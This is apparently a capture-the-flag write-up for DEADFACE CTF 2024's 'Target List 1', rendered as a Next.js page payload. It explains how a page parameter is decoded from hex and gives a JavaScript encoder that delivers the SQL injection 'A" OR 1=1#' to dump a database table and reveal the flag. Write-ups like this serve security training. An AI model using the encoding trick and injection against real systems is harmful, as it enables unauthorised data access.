1:"$Sreact.fragment"
2:I[10453,["/_next/static/chunks/b9afcb09c56609a6.js","/_next/static/chunks/59d5dd52dd9fcb16.js","/_next/static/chunks/0eb309e820c00a6d.js","/_next/static/chunks/239c8c4944a9f036.js","/_next/static/chunks/39b99946d2be6a43.js"],"default"]
1d:I[97367,["/_next/static/chunks/ff1a16fafef87110.js","/_next/static/chunks/b71c1cfea9076b4b.js"],"OutletBoundary"]
1e:"$Sreact.suspense"
:HL["https://gist.github.com/user-attachments/assets/78996e6e-b389-411c-aca3-a846a4b04c9c","image"]
:HL["https://gist.github.com/user-attachments/assets/297c9f02-ad97-4b6e-8182-95af781296e2","image"]
:HL["https://gist.github.com/user-attachments/assets/5700b3b3-7120-44d6-b07b-cfbf08e619d4","image"]
:HL["https://gist.github.com/user-attachments/assets/821a70ec-83b1-47ae-be64-f32d08203cf4","image"]
:HL["https://gist.github.com/user-attachments/assets/d714b8c5-e9fa-4ef2-9a7b-4151402b89e8","image"]
:HL["https://gist.github.com/user-attachments/assets/440879e4-f67c-4a08-b499-62a64b494298","image"]
:HL["https://gist.github.com/user-attachments/assets/ae6f04f8-b99a-4520-bbb9-0f530a128542","image"]
:HL["https://gist.github.com/user-attachments/assets/a8216a9e-5c2a-4b0d-9a30-00c2b40a0caa","image"]
:HL["https://gist.github.com/user-attachments/assets/a47e53ce-cbaf-4569-be74-588d45464645","image"]
:HL["https://gist.github.com/user-attachments/assets/226005a9-c14c-4afd-bf96-f23f2e7d7bae","image"]
:HL["https://gist.github.com/user-attachments/assets/a2d3d6ab-582c-485c-83a7-c6de6f5f92f5","image"]
:HL["https://gist.github.com/user-attachments/assets/1fd3dbe0-5dc9-4306-96d0-a9ace24af4d6","image"]
:HL["https://gist.github.com/user-attachments/assets/3d1651db-960f-4ba6-b3b5-1cda3f7083c4","image"]
:HL["https://gist.github.com/user-attachments/assets/6274445e-4609-4097-a385-6ba62a32d93c","image"]
:HL["https://gist.github.com/user-attachments/assets/051a1590-d119-4c4c-a1c7-8635c93b7d06","image"]
:HL["https://gist.github.com/user-attachments/assets/d6bb46cd-8222-4f6f-afff-93c48812a301","image"]
:HL["https://gist.github.com/user-attachments/assets/2d0e6150-06a5-48e4-a625-29bcab02ae98","image"]
:HL["https://gist.github.com/user-attachments/assets/6fd6e365-5101-48c7-90fe-72eb59159cbd","image"]
0:{"buildId":"QiRS6Sx9Ttvp1BSl4xu2I","rsc":["$","$1","c",{"children":[["$","div",null,{"children":["$","main",null,{"className":"text-pretty max-w-5xl mx-auto text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-4 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&_ol]:list-decimal [&_ol]:pl-6 [&_img]:rounded [&_li]:my-2","children":[["$","h1","h1-0",{"children":"DEADFACE CTF 2024 — Target List 1"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"Deadface is running a server where they have a list of targets they are planning on using in an upcoming attack. See if you can find any targets they are trying to hide."}],"\n",["$","p","p-1",{"children":["$","a","a-0",{"href":"http://targetlist.deadface.io:3001","children":"http://targetlist.deadface.io:3001"}]}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a simple website that looks like this:"}],"\n",["$","p","p-1",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/78996e6e-b389-411c-aca3-a846a4b04c9c","alt":"image"}]}],"\n",["$","p","p-2",{"children":"On each \"page\", we can find records that begin with \"A\", \"B\", and \"C\":"}],"\n",["$","p","p-3",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/297c9f02-ad97-4b6e-8182-95af781296e2","alt":"image"}]}],"\n",["$","p","p-4",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/5700b3b3-7120-44d6-b07b-cfbf08e619d4","alt":"image"}]}],"\n",["$","p","p-5",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/821a70ec-83b1-47ae-be64-f32d08203cf4","alt":"image"}]}],"\n",["$","p","p-6",{"children":"At first, it looks like we get to query users that start with"}],"\n",["$","$L2","pre-0",{"className":"my-2","children":"String.fromCharCode(64 + page)","language":"js"}],"\n",["$","p","p-7",{"children":["where ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"page"}]," is the integer query parameter passed to the page."]}],"\n",["$","p","p-8",{"children":["If we manually edit the ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"&page="}]," query parameter to go to page 4, it looks like we can query users beginning with \"D\" as expected."]}],"\n",["$","p","p-9",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/d714b8c5-e9fa-4ef2-9a7b-4151402b89e8","alt":"image"}]}],"\n",["$","p","p-10",{"children":"Similarly, we can query users with \"I\" on page 9, but somehow the query changes to \"II\" on page 99, \"IÙ\" on page 999, and \"IÙI\" on page 9999:"}],"\n",["$","p","p-11",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/440879e4-f67c-4a08-b499-62a64b494298","alt":"image"}]}],"\n",["$","p","p-12",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/ae6f04f8-b99a-4520-bbb9-0f530a128542","alt":"image"}]}],"\n",["$","p","p-13",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/a8216a9e-5c2a-4b0d-9a30-00c2b40a0caa","alt":"image"}]}],"\n",["$","p","p-14",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/a47e53ce-cbaf-4569-be74-588d45464645","alt":"image"}]}],"\n",["$","p","p-15",{"children":["so it looks like our input gets grouped into pairs when parsed. Furthermore, if we go to page ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"f"}],", we end up querying users starting with \"O\"; 'A' + 15."]}],"\n",["$","p","p-16",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/226005a9-c14c-4afd-bf96-f23f2e7d7bae","alt":"image"}]}],"\n","$L3","\n","$L4","\n","$L5","\n","$L6","\n","$L7","\n","$L8","\n","$L9","\n","$La","\n","$Lb","\n","$Lc","\n","$Ld","\n","$Le","\n","$Lf","\n","$L10","\n","$L11","\n","$L12","\n","$L13","\n","$L14","\n","$L15","\n","$L16","\n","$L17"]}]}],["$L18","$L19","$L1a","$L1b"],"$L1c"]}],"loading":null,"isPartial":false}
3:["$","p","p-17",{"children":"With this, we get a pretty clear picture of how our query parameter is parsed: a 0 is appended to the input, then the page number is interpreted as hex bytes (where 64 is added to each byte so 1 maps to \"A\"). Then, we can guess our input is handled something like so:"}]
4:["$","$L2","pre-1",{"className":"my-2","children":"function conv(s) {\n    const chars = ('0' + s).split('');\n    let ret = '';\n\n    for (let i = 0; i < chars.length; i += 2) {\n        let byte = chars[i];\n        if (i + 1 < chars.length) byte += chars[i + 1];\n\n        let num = 64 + parseInt(byte, 16);\n        ret += String.fromCharCode(num);\n    }\n\n    return ret;\n}","language":"js"}]
5:["$","p","p-18",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/a2d3d6ab-582c-485c-83a7-c6de6f5f92f5","alt":"image"}]}]
6:["$","p","p-19",{"children":["But then, when we go to page ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"162"}],","]}]
7:["$","p","p-20",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/1fd3dbe0-5dc9-4306-96d0-a9ace24af4d6","alt":"image"}]}]
8:["$","p","p-21",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/3d1651db-960f-4ba6-b3b5-1cda3f7083c4","alt":"image"}]}]
9:["$","p","p-22",{"children":["Why would the cent character cause things to fail? If we go to page ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"163"}],", something's not right; we get \"#\" instead of \"£\" as expected:"]}]
a:["$","p","p-23",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/6274445e-4609-4097-a385-6ba62a32d93c","alt":"image"}]}]
b:["$","p","p-24",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/051a1590-d119-4c4c-a1c7-8635c93b7d06","alt":"image"}]}]
c:["$","p","p-25",{"children":["Then, there must be a narrow range of characters where our bytes ",["$","em","em-0",{"children":"are"}]," subtracted by 128 allowing us to get a wider range of characters. To simplify things, we can assume this range applies to everything above 128 (not true for page ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"999"}]," seen earlier, but the discrepancy is ultimately unimportant to solve the challenge):"]}]
d:["$","$L2","pre-2",{"className":"my-2","children":"function conv(s) {\n    const rest = ('0' + s).split('');\n    let ret = '';\n\n    for (let i = 0; i < rest.length; i += 2) {\n        let group = rest[i];\n        if (i + 1 < rest.length) group += rest[i + 1];\n\n        let num = 64 + parseInt(group, 16);\n        if (num > 128) num -= 128;\n        ret += String.fromCharCode(num);\n    }\n\n    return ret;\n}","language":"js"}]
e:["$","p","p-26",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/d6bb46cd-8222-4f6f-afff-93c48812a301","alt":"image"}]}]
f:["$","p","p-27",{"children":["So our input was actually failing on double quotes... could that imply it was being passed to a database as an SQL query? Based on the updated ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"conv()"}]," function, we can write a simple ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"deconv()"}]," function to reverse desired strings to query param bytes:"]}]
10:["$","$L2","pre-3",{"className":"my-2","children":"function deconv(s) {\n    let ret = '1';\n    for (const c of s) {\n        let diff = c.charCodeAt(0) - 64;\n        if (diff < 0) diff += 128;\n\n        let str = diff.toString(16);\n        if (str.length < 2) str = '0' + str;\n        ret += str;\n    }\n    return ret;\n}","language":"js"}]
11:["$","p","p-28",{"children":"Then, we can run"}]
12:["$","p","p-29",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/2d0e6150-06a5-48e4-a625-29bcab02ae98","alt":"image"}]}]
13:["$","p","p-30",{"children":"to encode"}]
14:["$","$L2","pre-4",{"className":"my-2","children":"A\" OR 1=1#"}]
15:["$","p","p-31",{"children":"list the entire table, and get the flag:"}]
16:["$","p","p-32",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/6fd6e365-5101-48c7-90fe-72eb59159cbd","alt":"image"}]}]
17:["$","$L2","pre-5",{"className":"my-2","children":"flag{SQL-1nj3ct10n-thrU-x0r}"}]
18:["$","script","script-0",{"src":"/_next/static/chunks/59d5dd52dd9fcb16.js","async":true}]
19:["$","script","script-1",{"src":"/_next/static/chunks/0eb309e820c00a6d.js","async":true}]
1a:["$","script","script-2",{"src":"/_next/static/chunks/239c8c4944a9f036.js","async":true}]
1b:["$","script","script-3",{"src":"/_next/static/chunks/39b99946d2be6a43.js","async":true}]
1c:["$","$L1d",null,{"children":["$","$1e",null,{"name":"Next.MetadataOutlet","children":"$@1f"}]}]
1f:null
